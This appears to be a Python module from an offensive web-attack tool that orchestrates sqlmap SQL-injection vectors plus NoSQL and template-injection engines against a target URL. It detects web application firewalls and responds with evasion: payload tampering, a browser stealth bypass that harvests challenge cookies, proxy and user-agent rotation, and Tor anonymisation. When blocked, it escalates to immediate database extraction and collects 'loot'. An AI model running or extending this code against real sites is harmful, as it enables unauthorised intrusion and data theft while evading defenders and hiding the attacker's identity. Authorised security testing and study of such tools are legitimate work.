from __future__ import annotations

import asyncio
from typing import Any, Dict, List, Optional
from .cerberus_http_client import CerberusHTTPClient


async def execute_web_mode_phases(
    *,
    user_id: str,
    cfg: dict,
    target_url: str,
    sql_config: dict,
    omni_cfg: dict,
    max_parallel: int,
    requested_sqlmap_vectors: List[str],
    phases: List[int],
    is_deep: bool,
    defended_heuristics: Dict[str, Any],
    persisted_cookie_header: str,
    state_omni_meta: dict,
    python_exec: str,
    sqlmap_path: str,
    calibration_waf_detect_fn: Any,
    polymorphic_evasion_cls: Any,
    differential_validator_cls: Any,
    browser_stealth_cls: Any,
    build_vector_commands_fn: Any,
    run_sqlmap_vector_fn: Any,
    broadcast_log_fn: Any,
    engine_registry: Any,
) -> Dict[str, Any]:
    results: List[Dict[str, Any]] = []
    phases_ran: List[int] = []
    final_vuln = False
    waf_preset_last: Optional[str] = None
    bypass_attempted = False
    bypass_cookie_obtained = False

    sqlmap_vectors = [
        vector
        for vector in requested_sqlmap_vectors
        if vector in {"UNION", "ERROR", "TIME", "BOOLEAN", "STACKED", "INLINE"}
    ]

    for phase in phases:
        phases_ran.append(int(phase))
        try:
            waf_preset_last = await calibration_waf_detect_fn(target_url)
        except Exception:
            waf_preset_last = "general_strong"

        adaptive_cfg_enabled = bool(omni_cfg.get("adaptiveOrchestration", True))
        phase_sql_config = dict(sql_config or {})
        phase_omni_cfg = dict(omni_cfg or {})
        phase_max_parallel = max(1, int(max_parallel))
        phase_defended = bool(
            (str(waf_preset_last or "").lower() != "general_strong")
            or defended_heuristics.get("suspected")
        )

        if adaptive_cfg_enabled:
            if phase_defended:
                phase_sql_config["threads"] = 1
                phase_max_parallel = 1
                phase_omni_cfg["forceEvasion"] = True
                phase_omni_cfg["humanMode"] = True
                phase_omni_cfg["singleDiscoveryPass"] = True
                try:
                    await broadcast_log_fn(
                        "ORQUESTADOR",
                        "INFO",
                        f"Adaptive policy: defensa detectada ({waf_preset_last}) -> threads=1, parallel=1, human_mode=on",
                        {
                            "waf": waf_preset_last,
                            "heuristic_reasons": defended_heuristics.get("reasons"),
                            "threads": 1,
                            "parallel": 1,
                        },
                    )
                except Exception:
                    pass
            else:
                phase_omni_cfg["forceEvasion"] = False
                phase_omni_cfg["humanMode"] = False
                phase_omni_cfg["singleDiscoveryPass"] = True
                try:
                    await broadcast_log_fn(
                        "ORQUESTADOR",
                        "INFO",
                        "Adaptive policy: sin defensa activa -> evasiones desactivadas por defecto",
                        {
                            "waf": waf_preset_last,
                            "threads": phase_sql_config.get("threads"),
                            "parallel": phase_max_parallel,
                        },
                    )
                except Exception:
                    pass

        polymorphic = polymorphic_evasion_cls(waf_preset_last)
        diff_validator = differential_validator_cls()
        stealth_args: List[str] = []
        if persisted_cookie_header:
            stealth_args.append(f"--cookie={persisted_cookie_header}")
            bypass_cookie_obtained = True

        if phase_defended and (not persisted_cookie_header):
            bypass_attempted = True
            try:
                browser_headers = await browser_stealth_cls().bypass_challenges(target_url)
                cookie_header = str((browser_headers or {}).get("Cookie") or "").strip()
                if cookie_header:
                    persisted_cookie_header = cookie_header
                    bypass_cookie_obtained = True
                    stealth_args.append(f"--cookie={cookie_header}")
                    try:
                        phase_omni_cfg["forceEvasionCookies"] = cookie_header
                    except Exception:
                        pass
                    state_omni_meta[user_id] = dict(state_omni_meta.get(user_id) or {})
                    state_omni_meta[user_id]["session_cookie"] = cookie_header
            except Exception:
                pass

        sem = asyncio.Semaphore(max(1, int(phase_max_parallel)))
        defense_triggers = {"captcha", "waf", "login_redirect", "rate_limit", "connection_instability"}
        hot_rerun_done: set[str] = set()

        async def _run_sql_vec(vec_name: str, cmd: List[str]) -> None:
            async with sem:
                vec_upper = str(vec_name).upper()
                try:
                    result = await run_sqlmap_vector_fn(vec_name, cmd, broadcast_log_fn, timeout_sec=600)
                    payload = {
                        "vector": result.vector,
                        "vulnerable": bool(result.vulnerable),
                        "evidence": list(result.evidence or []),
                        "exit_code": int(result.exit_code),
                        "command": list(result.command or []),
                        "error": None,
                    }
                except Exception as exc:
                    try:
                        await broadcast_log_fn(
                            "CERBERUS_PRO",
                            "ERROR",
                            f"[{str(vec_name).upper()}] fallo de ejecución: {type(exc).__name__}: {exc}",
                            {"vector": str(vec_name).upper()},
                        )
                    except Exception:
                        pass
                    payload = {
                        "vector": str(vec_name).upper(),
                        "vulnerable": False,
                        "evidence": [],
                        "exit_code": 1,
                        "command": list(cmd or []),
                        "error": type(exc).__name__,
                    }

                if adaptive_cfg_enabled and vec_upper not in hot_rerun_done and (not bool(payload.get("vulnerable"))):
                    runtime_signals = _extract_runtime_signals(list(payload.get("evidence") or []))
                    if runtime_signals.intersection(defense_triggers):
                        hot_rerun_done.add(vec_upper)
                        phase_sql_config["threads"] = 1
                        phase_omni_cfg["forceEvasion"] = True
                        phase_omni_cfg["humanMode"] = True
                        phase_omni_cfg["singleDiscoveryPass"] = True
                        rerun_cfg = dict(phase_omni_cfg or {})
                        rerun_cfg["discoveryAlreadyApplied"] = True
                        if "waf_active_blocking" in runtime_signals:
                            rerun_cfg["rotateProxy"] = True
                            rerun_cfg["forceChangeUAFamily"] = True
                            if (phase_omni_cfg.get("oob") or {}).get("dnsDomain"):
                                rerun_cfg.setdefault("oob", {})["dnsDomain"] = phase_omni_cfg.get("oob").get("dnsDomain")
                            try:
                                extraction_cfg = dict(phase_omni_cfg or {})
                                extraction_sql = dict(phase_sql_config or {})
                                extraction_sql["getDbs"] = True
                                extraction_sql["currentUser"] = True
                                extraction_cfg["forceEvasion"] = True
                                if (phase_omni_cfg.get("oob") or {}).get("dnsDomain"):
                                    extraction_cfg.setdefault("oob", {})["dnsDomain"] = phase_omni_cfg.get("oob").get("dnsDomain")

                                extraction_commands = build_vector_commands_fn(
                                    python_exec=python_exec,
                                    sqlmap_path=sqlmap_path,
                                    target_url=target_url,
                                    sql_config=extraction_sql,
                                    stealth_args=stealth_args,
                                    polymorphic=polymorphic,
                                    vectors=[vec_upper],
                                    omni_cfg=extraction_cfg,
                                )
                                if extraction_commands:
                                    _, ext_cmd = extraction_commands[0]
                                    try:
                                        ext_res = await run_sqlmap_vector_fn(
                                            vec_upper,
                                            ext_cmd,
                                            broadcast_log_fn,
                                            timeout_sec=900,
                                        )
                                        ext_evidence = list(ext_res.evidence or [])
                                        ext_output = "\n".join(ext_evidence)
                                        is_tampered = diff_validator.detect_waf_response_tampering(ext_output)
                                        if is_tampered:
                                            try:
                                                await broadcast_log_fn(
                                                    "ORQUESTADOR",
                                                    "WARN",
                                                    f"[Extracción] Possible WAF response tampering detected for {vec_upper}; marking as unreliable; forces OOB/DNS",
                                                    {"vector": vec_upper, "is_tampered": True},
                                                )
                                            except Exception:
                                                pass
                                            ext_evidence.insert(0, "unreliable_extraction:response_tampered")
                                        else:
                                            try:
                                                await broadcast_log_fn(
                                                    "ORQUESTADOR",
                                                    "INFO",
                                                    f"[Extracción] Response validation passed for {vec_upper}; extraction appears trustworthy",
                                                    {"vector": vec_upper, "is_tampered": False},
                                                )
                                            except Exception:
                                                pass
                                        results.append(
                                            {
                                                "vector": ext_res.vector,
                                                "vulnerable": bool(ext_res.vulnerable),
                                                "evidence": ext_evidence,
                                                "exit_code": int(ext_res.exit_code),
                                                "command": list(ext_res.command or []),
                                                "error": None,
                                            }
                                        )
                                        try:
                                            await broadcast_log_fn(
                                                "ORQUESTADOR",
                                                "INFO",
                                                f"Immediate extraction attempted for {vec_upper} after active blocking; results appended",
                                                {"vector": vec_upper},
                                            )
                                        except Exception:
                                            pass
                                    except Exception:
                                        pass
                            except Exception:
                                pass
                        try:
                            await broadcast_log_fn(
                                "ORQUESTADOR",
                                "WARN",
                                f"Adaptive hot-rerun: [{vec_upper}] señales defensivas {sorted(list(runtime_signals))} -> reintento con evasión/human mode",
                                {"vector": vec_upper, "signals": sorted(list(runtime_signals))},
                            )
                        except Exception:
                            pass
                        rerun_commands = build_vector_commands_fn(
                            python_exec=python_exec,
                            sqlmap_path=sqlmap_path,
                            target_url=target_url,
                            sql_config=phase_sql_config,
                            stealth_args=stealth_args,
                            polymorphic=polymorphic,
                            vectors=[vec_upper],
                            omni_cfg=rerun_cfg,
                        )
                        if rerun_commands:
                            _, rerun_cmd = rerun_commands[0]
                            try:
                                rerun_res = await run_sqlmap_vector_fn(
                                    vec_upper,
                                    rerun_cmd,
                                    broadcast_log_fn,
                                    timeout_sec=600,
                                )
                                merged_evidence = list(
                                    dict.fromkeys(
                                        [*(payload.get("evidence") or []), *(list(rerun_res.evidence or []))]
                                    )
                                )
                                payload = {
                                    "vector": rerun_res.vector,
                                    "vulnerable": bool(rerun_res.vulnerable),
                                    "evidence": merged_evidence,
                                    "exit_code": int(rerun_res.exit_code),
                                    "command": list(rerun_res.command or []),
                                    "error": None,
                                }
                            except Exception as rerun_exc:
                                try:
                                    await broadcast_log_fn(
                                        "CERBERUS_PRO",
                                        "ERROR",
                                        f"[{vec_upper}] hot-rerun failed: {type(rerun_exc).__name__}: {rerun_exc}",
                                        {"vector": vec_upper},
                                    )
                                except Exception:
                                    pass
                results.append(payload)

        if adaptive_cfg_enabled and len(sqlmap_vectors) > 1:
            probe_vec = str(sqlmap_vectors[0]).upper()
            probe_cfg = dict(phase_omni_cfg or {})
            probe_cfg["discoveryAlreadyApplied"] = False
            probe_commands = build_vector_commands_fn(
                python_exec=python_exec,
                sqlmap_path=sqlmap_path,
                target_url=target_url,
                sql_config=phase_sql_config,
                stealth_args=stealth_args,
                polymorphic=polymorphic,
                vectors=[probe_vec],
                omni_cfg=probe_cfg,
            )
            if probe_commands:
                _, probe_cmd = probe_commands[0]
                await _run_sql_vec(probe_vec, probe_cmd)
                probe_payload = next(
                    (item for item in reversed(results) if str(item.get("vector") or "").upper() == probe_vec),
                    None,
                )
                probe_signals = _extract_runtime_signals(list((probe_payload or {}).get("evidence") or []))
                if probe_signals.intersection(defense_triggers):
                    phase_sql_config["threads"] = 1
                    phase_max_parallel = 1
                    phase_omni_cfg["forceEvasion"] = True
                    phase_omni_cfg["humanMode"] = True
                    phase_omni_cfg["singleDiscoveryPass"] = True
                    sem = asyncio.Semaphore(1)
                    try:
                        await broadcast_log_fn(
                            "ORQUESTADOR",
                            "WARN",
                            f"Adaptive hot-tune: señales defensivas {sorted(list(probe_signals))} -> threads=1, parallel=1, human_mode=on",
                            {"signals": sorted(list(probe_signals)), "threads": 1, "parallel": 1},
                        )
                    except Exception:
                        pass

            remaining_vectors = [str(vector).upper() for vector in sqlmap_vectors if str(vector).upper() != probe_vec]
            if remaining_vectors:
                remaining_cfg = dict(phase_omni_cfg or {})
                remaining_cfg["discoveryAlreadyApplied"] = True
                commands = build_vector_commands_fn(
                    python_exec=python_exec,
                    sqlmap_path=sqlmap_path,
                    target_url=target_url,
                    sql_config=phase_sql_config,
                    stealth_args=stealth_args,
                    polymorphic=polymorphic,
                    vectors=remaining_vectors,
                    omni_cfg=remaining_cfg,
                )
                await asyncio.gather(
                    *[
                        asyncio.create_task(_run_sql_vec(vec_name, cmd))
                        for vec_name, cmd in commands
                    ]
                )
        else:
            commands = build_vector_commands_fn(
                python_exec=python_exec,
                sqlmap_path=sqlmap_path,
                target_url=target_url,
                sql_config=phase_sql_config,
                stealth_args=stealth_args,
                polymorphic=polymorphic,
                vectors=sqlmap_vectors,
                omni_cfg=phase_omni_cfg,
            )
            await asyncio.gather(
                *[
                    asyncio.create_task(_run_sql_vec(vec_name, cmd))
                    for vec_name, cmd in commands
                ]
            )

        # ── Ghost Network Anonymization Layer ────────────────────────
        anon_client = CerberusHTTPClient(
            use_tor=bool(omni_cfg.get("tor", False)),
            tor_port=int(omni_cfg.get("torPort", 9050)),
            proxy=omni_cfg.get("proxy"),
            timeout=int(phase_sql_config.get("timeout", 15)),
            random_agent=bool(phase_sql_config.get("randomAgent", True))
        )
        # ─────────────────────────────────────────────────────────────

        if ("AIIE" in requested_sqlmap_vectors) or bool(omni_cfg.get("aiie")):
            aiie_engine = engine_registry.get_engine("aiie")
            if aiie_engine is not None:
                try:
                    # Pass the anonymized client to the engine
                    aiie_res = await aiie_engine.run(target_url, cfg, broadcast_log_fn, client=anon_client)
                    results.append(
                        {
                            "vector": aiie_res.vector,
                            "vulnerable": bool(aiie_res.vulnerable),
                            "evidence": list(aiie_res.evidence or []),
                            "exit_code": int(aiie_res.exit_code),
                            "command": list(aiie_res.command or []),
                            "loot": getattr(aiie_res, "loot", {}),
                            "error": None,
                        }
                    )
                except Exception as exc:
                    results.append(
                        {
                            "vector": "AIIE",
                            "vulnerable": False,
                            "evidence": [],
                            "exit_code": 1,
                            "command": [],
                            "error": type(exc).__name__,
                        }
                    )
        if bool(omni_cfg.get("noSql")):
            nosql_engine = engine_registry.get_engine("nosql")
            if nosql_engine is not None:
                try:
                    nosql_res = await nosql_engine.run(target_url, cfg, broadcast_log_fn, client=anon_client)
                    results.append(
                        {
                            "vector": nosql_res.vector,
                            "vulnerable": bool(nosql_res.vulnerable),
                            "evidence": list(nosql_res.evidence or []),
                            "exit_code": int(nosql_res.exit_code),
                            "command": list(nosql_res.command or []),
                            "error": None,
                        }
                    )
                except Exception as exc:
                    results.append(
                        {
                            "vector": "NOSQL",
                            "vulnerable": False,
                            "evidence": [],
                            "exit_code": 1,
                            "command": [],
                            "error": type(exc).__name__,
                        }
                    )
        if bool(omni_cfg.get("ssti")):
            ssti_engine = engine_registry.get_engine("ssti")
            if ssti_engine is not None:
                try:
                    ssti_res = await ssti_engine.run(target_url, cfg, broadcast_log_fn, client=anon_client)
                    results.append(
                        {
                            "vector": ssti_res.vector,
                            "vulnerable": bool(ssti_res.vulnerable),
                            "evidence": list(ssti_res.evidence or []),
                            "exit_code": int(ssti_res.exit_code),
                            "command": list(ssti_res.command or []),
                            "error": None,
                        }
                    )
                except Exception as exc:
                    results.append(
                        {
                            "vector": "SSTI",
                            "vulnerable": False,
                            "evidence": [],
                            "exit_code": 1,
                            "command": [],
                            "error": type(exc).__name__,
                        }
                    )
        
        # Cleanup Ghost Network connection pool
        await anon_client.close()

        final_vuln = final_vuln or any(bool(item.get("vulnerable")) for item in results)
        if final_vuln and (not is_deep):
            break

    return {
        "results": results,
        "phases_ran": phases_ran,
        "final_vuln": bool(final_vuln),
        "waf_preset_last": waf_preset_last,
        "bypass_attempted": bool(bypass_attempted),
        "bypass_cookie_obtained": bool(bypass_cookie_obtained),
        "persisted_cookie_header": str(persisted_cookie_header or ""),
    }


def _extract_runtime_signals(evidence_lines: List[str]) -> set:
    signals = set()
    for line in evidence_lines or []:
        if not isinstance(line, str):
            continue
        if line.startswith("runtime_signal:"):
            marker = line.split("runtime_signal:", 1)[1].strip().lower()
            if marker:
                signals.add(marker)
    return signals
